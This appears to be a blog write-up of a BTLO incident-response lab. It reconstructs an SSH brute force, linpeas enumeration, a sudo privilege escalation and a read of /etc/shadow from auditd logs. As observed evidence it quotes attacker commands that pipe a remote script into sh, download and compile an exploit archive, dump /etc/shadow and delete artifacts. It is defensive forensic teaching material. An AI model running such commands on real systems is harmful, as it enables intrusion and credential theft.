---
title: "BTLO Incident Response Case Study: Pranoid"
date: 2026-01-28
tags: ["btlo", "incident-response", "linux", "auditd", "bruteforce", "privilege-escalation", "forensics"]
categories: ["Incident Response", "Linux Forensics"]
draft: false
---


## Executive Summary

A forensic review of Linux auditd logs confirms that the host was compromised through an external SSH brute-force attack. The attacker authenticated as a low-privileged user, executed automated system enumeration, escalated privileges using a local sudo vulnerability, accessed sensitive credential material, and attempted basic anti-forensic cleanup. The entire intrusion lifecycle occurred within approximately six minutes.

---

## Scope and Evidence

Primary artifact:
- audit.log (Linux auditd)

Tools used:
- aureport
- ausearch
- Manual timeline correlation

Observed timeframe:
- 2021-10-04 20:22:07 to 2021-10-04 20:28:06



## Initial Triage and Signal Identification

A summary analysis of the audit log shows extreme activity density over a short time window:

- 87 failed login attempts
- 89 failed authentication attempts
- 1,606 failed syscalls
- 115 unique executables
- 192 commands executed
- 10,679 unique process IDs
- 16,732 total audit events

This volume and velocity of activity is inconsistent with human interaction and strongly indicative of automation.


## Initial Access Vector

### Authentication Activity

Audit records show repeated SSH authentication attempts targeting a single user account.

![](https://i.ibb.co/W43Lcwff/Pasted-image-20260128153416.png)

Targeted account:
- Username: btlo
- UID: 1001
```bash
sudo ausearch --input audit.log -m USER_AUTH,USER_LOGIN \
| grep -E "res=failed|success=no" \
| grep -E "addr=|rhost=" \
| sed -n 's/.*addr=\([^ ]*\).*/\1/p' \
| sort | uniq -c | sort -nr
```
![](https://i.ibb.co/VcqPZmW4/Pasted-image-20260128154343.png)

Source of authentication attempts:
- IP address: 192.168.4.155
- Service: /usr/sbin/sshd

Observed pattern:
- Dozens of failed SSH login attempts
- One successful authentication from the same source IP

This pattern confirms a successful SSH brute-force attack.


## Post-Compromise Command Activity

Immediately following authentication, terminal (TTY) logs reveal a structured sequence of commands executed by the attacker.

### Initial Environment Reconnaissance
![](https://i.ibb.co/jvgjcpy1/Pasted-image-20260128153618.png)

Commands observed:
- hostname
- whoami
- ls
- sudo -l

Purpose:
- Confirm host identity
- Identify current privilege level
- Enumerate accessible files
- Check sudo permissions and misconfigurations

These commands are typical of post-login validation performed by attackers.


## Automated System Enumeration

Shortly after initial recon, the attacker retrieved and executed an enumeration script from the same external IP used during brute-force attempts.

Command observed:
- wget -O - http://192.168.4.155:8000/linpeas.sh | sh

Source:
- Remote host: 192.168.4.155
- Protocol: HTTP
- Tool delivered: linpeas.sh

Purpose:
- Automated enumeration of kernel, sudo, SUID, cron, and configuration weaknesses
- Identification of local privilege escalation vectors

The execution of linpeas explains the subsequent surge in command executions and process creation.



## Privilege Escalation Staging

Following enumeration, the attacker staged a local exploit.

![](https://i.ibb.co/n8t2Yxm3/Pasted-image-20260128154055.png)

Commands observed:
- wget http://192.168.4.155:8000/evil.tar.gz
- tar zxvf evil.tar.gz
- cd evil
- make

```bash
sudo aureport -p -if audit.log pipe grep 'evil'
16156. 05/10/21 05:57:17 829992 /home/btlo/evil/evil 59 1001 481021
```

Source:
- Remote host: 192.168.4.155
- Payload type: Source code archive

Purpose:
- Deliver exploit source code
- Compile exploit locally to evade signature-based detection


## Privilege Escalation Execution

The attacker executed the compiled binary:
```bash
sudo ausearch --input audit.log -m EXECVE | grep evil
```
Command observed:
- ./evil 0

Execution metadata:
- Binary name: evil
- Execution path: /home/btlo/evil/evil
- Process ID: 829992
- Executing user: btlo (UID 1001)

Immediately following execution, the attacker revalidated privileges.

Command observed:
- whoami

Subsequent actions confirm that the exploit successfully escalated privileges to root.


## Anti-Forensic Cleanup

After achieving elevated privileges, the attacker removed exploit artifacts.

Commands observed:
- rm -rf /home/btlo/evil
- rm /home/btlo/evil.tar.gz

Purpose:
- Remove compiled binary and source code
- Reduce post-incident forensic artifacts

This cleanup was minimal but deliberate.


## Data Access and Impact

With root-level access confirmed, the attacker accessed sensitive credential storage.

Command observed:
- cat /etc/shadow

Impact:
- Exposure of password hashes for local accounts
- Full credential compromise of the host

This action confirms total system compromise and high business impact.


## Root Cause Analysis

The attack chain follows a well-established intrusion pattern:

1. External SSH brute-force attack
2. Successful authentication as low-privileged user
3. Manual and automated reconnaissance
4. Enumeration using linpeas
5. Local exploit delivery and compilation
6. Privilege escalation via sudo vulnerability
7. Credential data access
8. Anti-forensic artifact removal

The exploit behavior and timeframe align with CVE-2021-3156, a heap-based buffer overflow vulnerability in sudo.


## MITRE ATT&CK Mapping

| Tactic | Technique ID | Technique Name | Evidence Observed | Notes |
|------|-------------|----------------|------------------|------|
| Initial Access | T1110.001 | Brute Force: Password Guessing | 87 failed SSH logins, 89 failed auth attempts, single successful login | SSH brute-force against user `btlo` |
| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell | Interactive TTY sessions, shell commands executed | Shell used throughout attack |
| Discovery | T1082 | System Information Discovery | hostname, lsb_release -a | OS and host identification |
| Discovery | T1033 | System Owner/User Discovery | whoami (pre and post privesc) | Privilege validation |
| Discovery | T1083 | File and Directory Discovery | ls, find, grep, sed, cut, sort, uniq | Automated enumeration |
| Privilege Escalation | T1068 | Exploitation for Privilege Escalation | Execution of local exploit binary `evil` | Exploitation of sudo vulnerability |
| Command and Control | T1105 | Ingress Tool Transfer | wget downloads from attacker host | Tool and payload delivery |
| Defense Evasion | T1070.004 | Indicator Removal on Host: File Deletion | rm -rf exploit directory and archive | Anti-forensic cleanup |
| Credential Access | T1003.008 | OS Credential Dumping: /etc/shadow | cat /etc/shadow | Credential exposure |

## Indicators of Compromise (IOCs)

### Network IOCs

| Type | Indicator | Description |
|----|----------|------------|
| IP Address | 192.168.4.155 | Source of brute-force and payload delivery |
| URL | http://192.168.4.155:8000/linpeas.sh | Enumeration script |
| URL | http://192.168.4.155:8000/evil.tar.gz | Privilege escalation payload |
| Protocol | SSH | Initial access vector |
| Protocol | HTTP | Tool and payload transfer |

### Host-Based IOCs

| Type | Indicator | Description |
|----|----------|------------|
| User Account | btlo | Compromised user |
| Process | evil | Privilege escalation binary |
| Process ID | 829992 | PID of exploit execution |
| File Path | /home/btlo/evil/evil | Compiled exploit binary |
| File Path | /home/btlo/evil.tar.gz | Exploit archive |
| File Access | /etc/shadow | Sensitive credential file accessed |
| Tool | linpeas.sh | Automated enumeration script |

### Behavioral IOCs

| Behavior | Description |
|--------|------------|
| SSH brute-force pattern | High-volume failed SSH logins from single IP |
| Automated enumeration | Large volume of filesystem and command execution |
| Local compilation | make/gcc execution in user home directory |
| Privilege transition | whoami before and after exploit execution |
| Anti-forensics | Immediate deletion of exploit artifacts |

### Challenge Submission

- **Compromised account:** `btlo`
    
- **Initial access technique:** SSH brute-force attack
    
- **Attacker IP:** `192.168.4.155`
    
- **Enumeration tool:** `linpeas`
    
- **Privilege escalation binary & PID:** `evil`, PID `829992`
    
- **CVE exploited:** CVE-2021-3156
    
- **Vulnerability type:** Heap-based buffer overflow (Local Privilege Escalation)
    
- **Exfiltrated file:** `/etc/shadow`

---
## Conclusion

This incident demonstrates how a combination of weak authentication controls and unpatched local vulnerabilities can lead to rapid and complete system compromise. Despite the absence of a SIEM or EDR platform, auditd logs provided sufficient telemetry to reconstruct the attacker’s full kill chain with high confidence.

The case reinforces the importance of:
- SSH hardening and rate limiting
- Strong password policies
- Timely patching of privilege escalation vulnerabilities
- Retention and review of auditd logs for forensic readiness